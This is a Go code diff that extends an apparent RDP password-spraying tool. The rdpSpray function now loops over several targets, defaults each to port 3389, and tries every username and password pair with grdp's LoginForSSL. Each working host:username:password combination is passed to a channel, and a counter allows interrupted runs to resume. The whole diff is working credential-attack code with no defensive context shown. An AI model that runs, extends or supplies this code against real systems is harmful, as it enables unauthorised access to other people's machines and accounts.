@@ -26,25 +26,30 @@ type Client struct {
 func rdpSpray (wg *sync.WaitGroup, channelToCommunicate chan string,  taskToRun task, storeResult *int) {
 	defer wg.Done()
 	internalCounter := 0
-	if taskToRun.target.port == 0 {
-		taskToRun.target.port = 3389
-	}
-	for _,password := range taskToRun.passwords {
-		for _,username := range taskToRun.usernames {
-			if internalCounter >= *storeResult {
-				client := grdp.NewClient(stringifyTarget(taskToRun.target), glog.NONE)
-				var err error
-				err = client.LoginForSSL(".",username, password)
-				if err != nil {
-					fmt.Print("-")
+	for _,taskTarget := range taskToRun.targetsRaw {
+		temporaryTarget := parseTarget(taskTarget)
+		taskToRun.target = temporaryTarget
+		if taskToRun.target.port == 0 {
+			taskToRun.target.port = 3389
+		}
+		for _,password := range taskToRun.passwords {
+			for _,username := range taskToRun.usernames {
+				if internalCounter >= *storeResult {
+					client := grdp.NewClient(stringifyTarget(taskToRun.target), glog.NONE)
+					var err error
+					err = client.LoginForSSL(".",username, password)
+					if err != nil {
+						fmt.Print("-")
+					} else {
+						fmt.Print("+")
+						channelToCommunicate <- taskToRun.target.host + ":" + username+":"+password
+					}
+					*storeResult++
 				} else {
-					fmt.Print("+")
-					channelToCommunicate <- username+":"+password
 				}
-				*storeResult++
-			} else {
+				internalCounter++
 			}
-			internalCounter++
 		}
 	}
+
 }
